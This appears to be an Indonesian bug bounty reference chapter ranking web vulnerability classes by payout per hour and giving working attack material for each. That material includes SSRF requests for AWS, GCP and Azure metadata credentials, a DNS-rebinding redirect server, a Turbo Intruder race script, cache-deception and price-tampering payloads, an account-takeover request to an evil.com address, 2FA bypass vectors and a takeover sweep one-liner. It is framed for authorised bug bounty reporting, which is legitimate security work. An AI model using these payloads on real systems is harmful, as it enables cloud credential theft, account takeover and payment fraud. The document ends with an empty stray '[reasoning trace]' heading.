# bb-classes — bb

# Bab Referensi: Bug Class "Payout-to-Effort 2026"

Tabel prioritas triase (kalibrasi payout rendah–tinggi vs jam kerja):

| Kelas | Contoh target | Effort (jam) | Payout tipikal | Rasio $/jam | Catatan |
|---|---|---|---|---|---|
| Subdomain takeover | SaaS CNAME → herokuapp, azurewebsites | 1–4 | $200–$2.500 | Tinggi | Hidupkan PoC dulu |
| SSRF metadata | AWS IMDSv1, GCP v1beta1 | 2–8 | $500–$5.000 | Tinggi | IMDSv2 = no-go |
| Race limit overrun | coupon, withdraw, follow | 4–12 | $300–$3.000 | Sedang–tinggi | Butuh Turbo Intruder http2 single-packet |
| ATO chain | OAuth + email change + logout | 6–20 | $1.000–$8.000 | Sedang | Chain-heavy, butuh video |
| 2FA bypass | OTP brute, response tamper | 2–6 | $500–$4.000 | Tinggi | Rate-limit angle |
| Web cache deception | SaaS profil/premium path | 3–8 | $400–$3.000 | Sedang | Bergantung CDN |
| Business logic price/qty | checkout qty=-1, price decimal | 2–6 | $200–$2.500 | Rendah–sedang | Sering ditolak "by design" |
| TOCTOU payment/coupon | redeem → refund | 4–10 | $500–$3.000 | Sedang | Butuh observability |

---

## 1. Subdomain Takeover Flow

Apa yang dikirim:
```
dig +short CNAME dev.target.com
dig +short A dev.target.com
curl -sI https://dev.target.com | head
```

Apa yang muncul (indikator takeable):
| Provider | Body / header khas | Status takeover |
|---|---|---|
| Heroku | `No such app` | Ya |
| Azure App Service | `404 Web Site not found` + `x-msedge-ref` | Ya (slot/app deleted) |
| GitHub Pages | `There isn't a GitHub Pages site here` | Ya |
| Shopify | `Sorry, this shop is currently unavailable` | Ya |
| Netlify | `Not Found - Request ID` | Ya |
| CloudFront | `Bad request` + `x-cache` | Kadang (distribution ada) |
| Fastly | `Fastly error: unknown domain` | Ya |
| AWS S3 website | `NoSuchBucket` | Ya |
| Zendesk | `Help Center Closed` | Ya |
| Statuspage | `You are being redirected` + no page | Ya |
| WordPress.com | `Do you want to register` | Ya |

Kenapa berhasil: DNS masih mengarah ke provider; resource sudah dihapus tapi tidak di-cleanup. Kenapa gagal: provider kini mengikat `custom domain` ke akun sebelum serving content (Heroku pasca‑2021 untuk app aktif, Vercel 2023+ verifikasi TXT) — `CNAME` dangling tanpa takeover jadi hanya info, bukan vuln.

Payload verifikasi (Heroku):
```
heroku create pwned-$RANDOM
heroku domains:add dev.target.com
# lalu curl bukti origin
```

Angle report: sertakan screenshot DNS + halaman provider "No such app" **sebelum** klaim, URL pwned live, dan skenario impact konkret (cookie scope `.target.com`, phishing di subdomain resmi, CORS `*.target.com`).

---

## 2. ATO Chain (email change → session invalidation gap)

Rantai umum yang masih hidup di 2026:
1. Register akun dengan email A (attacker).
2. Tukar email ke korban B melalui endpoint `POST /api/account/email` yang **tidak** memverifikasi bahwa email saat ini terverifikasi/owned.
3. Reset password → OTP dikirim ke B.
4. Klik link reset dari inbox attacker (karena attacker belum benar-benar kehilangan kontrol) — variasi: OTP disimpan di Redis dengan key `reset:{uid}` tanpa TTL → replay setelah korban reset.

Apa yang dikirim:
```
POST /api/v1/account/email HTTP/2
Host: target.com
Content-Type: application/json
Cookie: _session=<A>

{"new_email":"attacker+1@evil.com","current_password":"<A>"}
```
Apa yang muncul: `200 {"ok":true}` tanpa step verifikasi email baru → lanjut `POST /api/v1/password/forgot {"email":"attacker+1@evil.com"}`. Karena sesi korban tidak di-invalidate (`session_version` tidak di-bump), attacker memegang sesi A dan korban kehilangan akses.

Kegagalan umum 2026: sinkronisasi IdP — jika target pakai Okta/Auth0, `email` immutable setelah verifikasi; chain patah di step 2.

Angle report: video ≤60s, timeline request, dampak "account tidak bisa dipulihkan oleh korban" (permanen ATO) — nilainya beda dari ATO sementara.

---

## 3. SSRF Metadata

Apa yang dikirim (IMDSv1, AWS):
```
GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: target.com
```
Apa yang muncul: `200 {"role":"ec2-role-xyz"}` → lanjut ke `.../security-credentials/ec2-role-xyz` → JSON `{AccessKeyId, SecretAccessKey, Token, Expiration}`.

GCP (metadata v1beta1, masih ada di VM legacy + beberapa Cloud Run):
```
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
```
Header tidak wajib di v1beta1; v1 (`Metadata-Flavor: Google`) = patched.
Azure:
```
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
Header: Metadata: true
```

Kenapa berhasil: allowlist regex lemah (`^https?://[^\s]+$`), redirect follow tanpa validasi hop pasca-DNS, DNS rebinding (`attacker.com` → `169.254.169.254` TTL 0). Kenapa gagal: egress proxy metadata `169.254.0.0/16` di-deny di network layer (standar di EKS 1.28+ dengan IMDS hop limit = 1).

Payload redirect/rebinding:
```python
# 302 chain
@app.route("/r")
def r(): return redirect("http://169.254.169.254/latest/meta-data/", 302)
# DNS rebinding: toggle A record antara 1.2.3.4 dan 169.254.169.254 per query
```

Angle report: **jangan** eksfiltrasi kredensial penuh; cukup `AccessKeyId` prefix + `Expiration` di redacted. Report tanpa impact AWS (`aws sts get-caller-identity` terlarang) = sering downgrade ke informational.

---

## 4. Web Cache Deception di SaaS

Apa yang dikirim:
```
curl -s -H "Cookie: session=<victim>" \
  "https://app.target.com/api/me/settings/foo.css" | grep email
```
Apa yang muncul: HTML profil (bukan 404) dengan `Cache-Control: public` dari CDN upstream → attacker tanpa cookie request path yang sama menghasilkan data korban.

Konfigurasi rapuh yang dibidik:
| Stack | Signature vuln |
|---|---|
| nginx 1.25 `try_files $uri $uri/ /index.html` | `*.css`, `*.jpg` fallback ke SPA shell |
| Cloudflare 2024+ cache rule `ends_with .css/.js` | `?` variant dan `;.css` (matrix param) |
| Fastly VCL `lookup` tanpa `req.http.Cookie` guard | Set-Cookie tidak memblok cache |
| Varnish 7 `default.vcl` dengan `return(lookup)` sebelum `beresp.ttl=0` | Kalau backend 200 untuk path ekstensi apa pun |

Payload varian delimiter:
```
/profile;.css
/profile%3B.css
/profile.json.css
/profile/.css
/profile%00.css        # nginx 1.25 → 400, biasanya gagal
/profile..;css         # kadang LOLos di CDN lama
```

Kenapa gagal 2026: mayoritas CDN populer (Cloudflare Cache Rules GA, Fastly 2024) kini punt `Set-Cookie` + `Vary: Cookie` di origin respons SPA; `__cf_bm` cookie ikut memaksa miss.

Angle report: sertakan dua request (victim lalu attacker) dengan `Age`/`CF-Cache-Status: HIT` di request kedua; impact konkret = token CSRF, email, plan tier.

---

## 5. Race Condition

### 5a. Limit overrun (follow, like, redeem)
Apa yang dikirim — Turbo Intruder, HTTP/2 single-packet attack (gate 20–30 request):
```
POST /api/follow/123 HTTP/2
X-Forwarded-For: <rotating>
Cookie: session=<A>
```
Script inti (Turbo Intruder 2024+, `race-single-packet-attack.py`):
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1,
                           engine=Engine.HTTP2, requestsPerConnection=100, pipeline=False)
    for i in range(30):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    if '200' in req.status: table.add(req)
```
Apa yang muncul: N× `200 {"following":true}` untuk N request → `followers_count` = 30 dari satu akun. Kenapa berhasil: baca `SELECT count` lalu `INSERT` tanpa `UNIQUE(user_id, target_id)`; DB default `READ COMMITTED`. Kenapa gagal: PostgreSQL `SERIALIZABLE` atau `INSERT ... ON CONFLICT DO NOTHING` + advisory lock → hanya 1 sukses.

### 5b. TOCTOU payment/coupon
```
POST /api/cart/redeem  {"coupon":"WELCOME10","order_id":"A"}
POST /api/cart/checkout {"order_id":"A"}
# gate keduanya pada satu paket; varian: redeem ke dua order_id di paket sama
```
Apa yang muncul: dua order dapat diskon, atau satu coupon `usage_count` = 1 tapi dua order `status=paid`. Cek dengan `GET /api/orders/A` vs `/B` membandingkan `subtotal`.

Kenapa gagal: Stripe 2024+ `Idempotency-Key` di checkout, `SELECT ... FOR UPDATE` di coupon row, Redis `SETNX coupon:{id}`.

Angle report: video 1-shot dengan log Turbo Intruder, tunjukkan delta saldo/`usage_count` sebelum-sesudah. Race tanpa bukti state delta = nol.

---

## 6. 2FA Bypass

Payload arsenal 2026:

| Vektor | Kirim | Muncul | Gagal karena |
|---|---|---|---|
| OTP brute tanpa rate-limit | `POST /2fa/verify {"code": 000000..999999}` | `200` pada code valid | Cloudflare rate limit 5/min |
| OTP reuse | verify → logout → verify code sama | `200` | code di-set `consumed_at` |
| Response tamper (client-side) | `200` → ganti body jadi `{"mfa":"ok"}` di proxy | dashboard load | backend cek session `mfa_passed` |
| Backup code array | kirim array `["",""]` / `null` | `200` | strict type validation |
| Dua window | request verify paralel (race) | 2 sesi lolos | session store atomic |
| Bypass via IdP | login Google SSO + `?mfa=skip` | session tanpa TOTP | flag hanya di IdP, gateway re-check |
| Step-skip state machine | `POST /register/step3` tanpa step2 | `200 dashboard` | server-side step check |

Contoh tamper:
```
POST /api/2fa/verify HTTP/2
{"code":"123456","action":"disable"}
```
Lalu langsung `POST /api/2fa/disable` tanpa verify — banyak bug: endpoint disable memanggil `verify` hanya dari client-side.

Kenapa gagal 2026: FIDO2/passkey jadi default di Google/Okta sejak 2023 — OTP fallback sering dimatikan, mempersempit target.

---

## 7. Business Logic Price / Quantity

Payload klasik:
```
{"qty":-1,"price":100}            # refund sisi attacker
{"qty":0.0001,"price":"-1"}       # float + string
{"price":1e-9}                    # exponent
{"qty":"1e2","price":"0"}
{"price":100.999}                 # trunc vs round
{"price":{"$gt":0}}               # NoSQL operator injection di cart
```
Apa yang muncul: `subtotal: -100`, `total: 0`, atau `payment_intent` Stripe untuk 1¢ padahal item $99.

| Bug | Kirim | Muncul | Gagal karena |
|---|---|---|---|
| Negative qty → credit | `qty:-1` | subtotal negatif | validator integer `>0` |
| Price override | `price: 1` | checkout 1 IDR | harga dari server-side lookup |
| Decimal trunc | `price: 0.009` | 0.00 | round half-up |
| Coupon stack | `coupon[]=A&coupon[]=B` | total 0 | single coupon field |
| Currency swap | `currency: "IDR"` saat checkout | harga 100× murah | allowlist currency per plan |
| Tax bypass | `country: "ZZ"` | pajak 0 | GeoIP server-side |

Kenapa gagal 2026: Stripe Payment Intent + Price object (bukan `amount` ad-hoc), backend 3DS re-validate total. Banyak target SaaS pakai Stripe Billing `checkout.sessions.create` dengan `line_items` server-derived — endpoint custom price jarang.

Angle report: jangan klaim "free money" — tunjukkan **state** (order terbayar, invoice paid, `payment_intent.succeeded`) bukan sekadar response 200. Sertakan kerugian kuantitatif per unit.

---

## 8. Cara Menemukan (Discovery Playbook)

| Kelas | Query / tool | Signature |
|---|---|---|
| Subdomain takeover | `subfinder -d target.com -silent \| dnsx -cname -resp` → `httpx -status-code -title -tech-detect` | halaman provider "no such app" |
| SSRF | crawling param URL: `ffuf -w params.txt -u https://t/{{}}?url=FUZZ -mr "169.254\|metadata"` | response metadata |
| WCD | `ffuf` path `/profileFUZZ` FUZZ=`;.css,.css,..;.css,/.css,%3B.css` | 200 + `CF-Cache-Status: HIT` |
| Race | `Turbo-Intruder` single-packet, `gate=` | N 200 identik |
| 2FA | Burp auth flow capture → compare `mfa_token` JWT claim vs session | claim `amr:["pwd"]` tapi dashboard |
| Bizlogic | Burp `Param Miner` header `X-Forwarded-*`, `?test=1`, integer boundary `0,-1,1e309` | total/quantity anomali |
| ATO | diff login flow email vs oauth flow session_version | tidak ada invalidasi sesi |

Shell one-liner takeover sweep:
```bash
subfinder -d target.com -silent | dnsx -silent -cname -resp \
| awk '{print $1, $3}' | while read h c; do
    case "$c" in
      *herokuapp*|*azurewebsites*|*github.io*|*netlify*|*cloudfront*|*fastly*)
        code=$(curl -s -o /dev/null -w "%{http_code}" "https://$h")
        echo "$h -> $c [$code]";;
    esac
done
```

---

## 9. Angle Report (Spesifisitas Klaim)

| Kelas | Judul kuat | Bukti minimum | Hindari |
|---|---|---|---|
| Subdomain takeover | "Takeover subdomain `dev.` via dangling Heroku CNAME memungkinkan cookie theft `.target.com`" | DNS + pwned live + screenshot Set-Cookie | klaim tanpa host live |
| SSRF | "SSRF IMDSv1 ke `ec2-role` — akses S3 bucket `prod-uploads`" | redacted key prefix + ARN role | dump kredensial penuh |
| WCD | "Cache deception di `/settings` via `.css` — exfil email & CSRF token lintas user" | victim + attacker request, `Age>0` | jalur `%00` |
| Race | "Single-packet race pada `/redeem` menghasilkan 12× pakai kupon → kerugian Rp X" | log gate + delta `usage_count` | retry serial (bukan race) |
| 2FA | "Bypass 2FA via response tamper endpoint `verify` versi mobile 5.12" | request raw + session tanpa `amr=otp` | uji di akun sendiri saja → engineering butuh victim sim |
| Bizlogic | "Negative quantity di checkout memicu credit balance (order #123 saldo +$99)" | invoice + screenshot order | "bisa kirim harga 0" tanpa order |
| ATO | "Permanen ATO: email change tanpa re-auth + session_version tidak di-bump" | timeline + video korban terkunci | ATO tidak bisa dipulihkan |

Aturan notifikasi: untuk SSRF/AWS, API key prefix saja. Untuk ATO, jangan buka akun korban lebih dari 1 menit. Untuk race, dokumentasikan `request_time` delta <5ms.

---

## 10. Jebakan Operasional (yang benar-benar mematikan teknik)

- **Purge cache / TTL**: WCD PoC HIT hanya jika `Age` > 0 pada request **kedua**. Di Cloudflare Free TTL 0 untuk HTML dinamis — cek `cache-control` origin dulu.
- **Header `Vary: Cookie`**: destruktif di CDN modern — WCD sering mati bukan karena origin.
- **TLS / HSTS preload di subdomain**: takeover berhasil di DNS tapi `chrome 131` preload list menolak cert self-signed → PoC harus pakai cert valid dari provider takeover.
- **IMDSv2 default**: instans AWS 2023+ punya `HttpTokens=required`. SSRF `169.254.169.254` return `401` — bukan vuln. Cek `/latest/api/token` konsistensinya.
- **Egress proxy**: metadata IP di-deny di VPC/EKS 1.28+ (default `IMDS hop limit = 1`), SSRF ke DNS rebinding tetap kena `169.254.0.0/16` deny.
- **Turbo Intruder HTTP/2**: server nginx < 1.25 tanpa `http2_max_concurrent_streams` tinggi → hasil race non-deterministik. Retry 3× sebelum lapor.
- **Race pada database read replica**: replication lag 100–500ms menciptakan ilusi race. Uji di endpoint read-write yang sama, bukan endpoint GET.
- **Idempotency-Key** di Stripe/shopify checkout mematikan TOCTOU coupon — cek header di request checkout pertama.
- **Passkey menggantikan OTP**: target yang sudah migrasi FIDO2 tidak punya endpoint `/2fa/verify` sama sekali → jangan kirim payload ke endpoint mati.
- **Cloudflare Turnstile / rate-limit**: brute 6-digit OTP (1e6) butuh gate 500ms; tanpa `X-Forwarded-For` rotation → 429 di request ~20, klaim vuln gugur.
- **Subdomain takeover post-invalidation**: Heroku 2021+ minta verifikasi TXT; Azure `App Service` slot deleted kadang CNAME resolve ke `404` tapi register domain butuh akun Azure tenant lain — takeover tetap mungkin hanya bila `azurewebsites.net` app benar-benar deleted (bukan slot swap).
- **SSRF tanpa egress**: koneksi dari worker Cloudflare Workers → `169.254.169.254` pasti diblok; SSRF hanya di origin VM, bukan edge.
- **Bizlogic "by design"**: negative qty yang mengembalikan saldo kredit sering dinyatakan sebagai fitur — siapkan demo order terbayar (bukan sekadar cart) dan angka kerugian kumulatif.
- **Legal scope**: race yang menyerang akun orang lain di prod = out of scope kecuali program izinkan; uji single-account dulu, dokumentasikan intent.

---

## [reasoning trace]


